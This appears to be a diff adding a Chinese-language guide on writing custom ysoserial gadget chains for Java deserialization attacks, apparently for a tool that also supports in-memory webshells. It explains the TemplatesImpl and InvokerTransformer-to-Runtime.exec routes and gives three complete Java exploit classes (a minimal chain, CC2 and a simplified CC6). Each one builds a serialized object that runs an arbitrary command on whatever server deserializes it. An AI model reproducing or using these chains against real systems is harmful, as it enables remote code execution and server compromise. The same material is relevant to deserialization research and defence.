@@ -1,0 +1,200 @@
+═══════════════════════════════════════════════
+  自定义链编写指南
+═══════════════════════════════════════════════
+
+【先说结论】
+  - 自定义链是当前工具里最稳的扩展点之一
+  - 只要实现 ObjectPayload 并返回可序列化对象，通常就能正常工作
+  - 这条路比“自定义内存马全链适配”稳定得多
+
+【必须满足】
+  1. 类必须实现 ysoserial.payloads.ObjectPayload 接口
+  2. 实现 getObject(String command) 方法
+  3. 现在仅支持导入已编译好的 .class 文件
+
+【关于 ObjectPayload 的泛型参数】
+  ObjectPayload<T> 的泛型 T 只是标注返回类型，不影响功能。
+  以下写法效果完全一样，选哪种都行：
+    implements ObjectPayload<Object>          // 返回 Object
+    implements ObjectPayload<PriorityQueue>   // 标注 gadget 入口类
+    implements ObjectPayload                  // 不写泛型（有编译警告但不影响）
+
+【核心工具方法 — 两条路线】
+
+  路线一：Gadgets.createTemplatesImpl(command)
+  ─────────────────────────────────────────
+  ysoserial 内置工具，根据 command 自动生成一个
+  继承 AbstractTranslet 的恶意类，其 static 块
+  会执行 command。无需手写 EvilClass！
+
+  原理：TemplatesImpl.defineClass() 加载字节码
+        → 触发 static 块 → 执行命令
+  支持内存马：是
+  适用链：CC2, CC3, CC4, CC8, CC11, CC12 等
+
+  ★ 你不需要关心 TemplatesImpl 内部字段！
+    Gadgets.createTemplatesImpl(command) 一行搞定：
+    - 自动用 javassist 生成恶意类字节码（命令由参数决定）
+    - 自动设置 _bytecodes、_name、_tfactory 等字段
+    - 你只需要关心"怎么触发 TemplatesImpl.newTransformer()"
+
+  ★ 注意：该方法返回 Object 类型，如需 TemplatesImpl 类型
+    需要强制转换：
+    TemplatesImpl t = (TemplatesImpl) Gadgets.createTemplatesImpl(cmd);
+
+  路线二：InvokerTransformer 链调用 Runtime.exec()
+  ─────────────────────────────────────────
+  通过 Transformer 链反射调用 Runtime.exec(cmd)，
+  直接执行命令，不走 TemplatesImpl。
+
+  原理：ChainedTransformer → InvokerTransformer
+        → Runtime.getRuntime().exec(cmd)
+  支持内存马：否
+  适用链：CC1, CC5, CC6, CC7 等
+
+【注意事项】
+  - 仅支持 .class（直接用）
+  - 文件会复制到 payloads/，不依赖原始路径
+  - 有内部类（如 Foo$1.class）会一并复制
+  - .class 文件用于 JNDI Reference 模式时不能包含包名
+  - 选了目标不存在的依赖类，反序列化会 ClassNotFoundException
+
+【@Dependencies 注解】
+  声明链所需的依赖，导入时自动读取，格式为 Maven 坐标：
+  单个依赖：
+    @Dependencies({ "org.apache.commons:commons-collections4:4.0" })
+  多个依赖：
+    @Dependencies({
+        "org.apache.commons:commons-collections4:4.0",
+        "commons-beanutils:commons-beanutils:1.8.3"
+    })
+  不写也行，不影响编译和运行，只是不显示依赖信息
+
+═══════════════════════════════════════════════
+  示例1：最简自定义链（支持内存马）
+  使用 Gadgets.createTemplatesImpl(command)
+  无需手写继承 AbstractTranslet 的恶意类
+═══════════════════════════════════════════════
+
+import ysoserial.payloads.ObjectPayload;
+import ysoserial.payloads.util.Gadgets;
+import ysoserial.payloads.annotation.Dependencies;
+
+@Dependencies({ "commons-collections:commons-collections:3.1" })
+public class MyCustomChain implements ObjectPayload<Object> {
+
+    public Object getObject(final String command) throws Exception {
+        // Gadgets.createTemplatesImpl(command) 做了什么：
+        // 1. 用 javassist 动态生成一个继承 AbstractTranslet 的类
+        // 2. 该类的 static 块执行 command
+        // 3. 将字节码设入 TemplatesImpl 的 _bytecodes 字段
+        // 4. 返回配置好的 TemplatesImpl 对象
+        //
+        // 你不需要手写 EvilClass，
+        // Gadgets 帮你自动生成了等价的恶意类！
+        return Gadgets.createTemplatesImpl(command);
+    }
+}
+
+═══════════════════════════════════════════════
+  示例2：CC2 自定义链（支持内存马）
+  Gadgets.createTemplatesImpl + InvokerTransformer
+═══════════════════════════════════════════════
+
+import ysoserial.payloads.ObjectPayload;
+import ysoserial.payloads.util.Gadgets;
+import ysoserial.payloads.annotation.Dependencies;
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.*;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import java.util.PriorityQueue;
+import java.lang.reflect.Field;
+
+@Dependencies({ "org.apache.commons:commons-collections4:4.0" })
+public class MyCC2 implements ObjectPayload<PriorityQueue> {
+
+    public PriorityQueue getObject(String cmd) throws Exception {
+        // 1. 用 Gadgets 生成恶意 TemplatesImpl（无需手写 EvilClass）
+        TemplatesImpl templates = (TemplatesImpl) Gadgets.createTemplatesImpl(cmd);
+
+        // 2. 先用 ConstantTransformer 占位，避免序列化时触发
+        TransformingComparator comparator =
+            new TransformingComparator(new ConstantTransformer(1));
+
+        // 3. 构造 PriorityQueue
+        PriorityQueue queue = new PriorityQueue(2, comparator);
+        queue.add(templates);
+        queue.add(templates);
+
+        // 4. 反射替换为真正的 InvokerTransformer
+        setFieldValue(comparator, "transformer",
+            new InvokerTransformer("newTransformer", null, null));
+
+        return queue;
+    }
+
+    static void setFieldValue(Object obj, String name, Object val)
+            throws Exception {
+        Field f = obj.getClass().getDeclaredField(name);
+        f.setAccessible(true);
+        f.set(obj, val);
+    }
+}
+
+═══════════════════════════════════════════════
+  示例3：CC6 简化版（仅命令执行，不支持内存马）
+  InvokerTransformer 链 → Runtime.exec()
+═══════════════════════════════════════════════
+
+import ysoserial.payloads.ObjectPayload;
+import ysoserial.payloads.annotation.Dependencies;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.*;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+import java.util.*;
+
+@Dependencies({ "commons-collections:commons-collections:3.1" })
+public class MyCC6 implements ObjectPayload<HashSet> {
+
+    public HashSet getObject(final String command) throws Exception {
+        Transformer[] fake = { new ConstantTransformer(1) };
+        Transformer[] real = {
+            new ConstantTransformer(Runtime.class),
+            new InvokerTransformer("getMethod",
+                new Class[]{String.class, Class[].class},
+                new Object[]{"getRuntime", new Class[0]}),
+            new InvokerTransformer("invoke",
+                new Class[]{Object.class, Object[].class},
+                new Object[]{null, new Object[0]}),
+            new InvokerTransformer("exec",
+                new Class[]{String.class},
+                new Object[]{command})
+        };
+        ChainedTransformer chain = new ChainedTransformer(fake);
+        Map lazyMap = LazyMap.decorate(new HashMap(), chain);
+        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
+        HashSet set = new HashSet(1);
+        set.add("foo");
+        // 反射替换 HashSet 内部 HashMap 的 key
+        java.lang.reflect.Field f = set.getClass()
+            .getDeclaredField("map");
+        f.setAccessible(true);
+        Map map = (Map) f.get(set);
+        java.lang.reflect.Field f2 = map.getClass()
+            .getDeclaredField("table");
+        f2.setAccessible(true);
+        Object[] table = (Object[]) f2.get(map);
+        Object node = table[0];
+        java.lang.reflect.Field f3 = node.getClass()
+            .getDeclaredField("key");
+        f3.setAccessible(true);
+        f3.set(node, entry);
+        java.lang.reflect.Field f4 = chain.getClass()
+            .getDeclaredField("iTransformers");
+        f4.setAccessible(true);
+        f4.set(chain, real);
+        return set;
+    }
+}
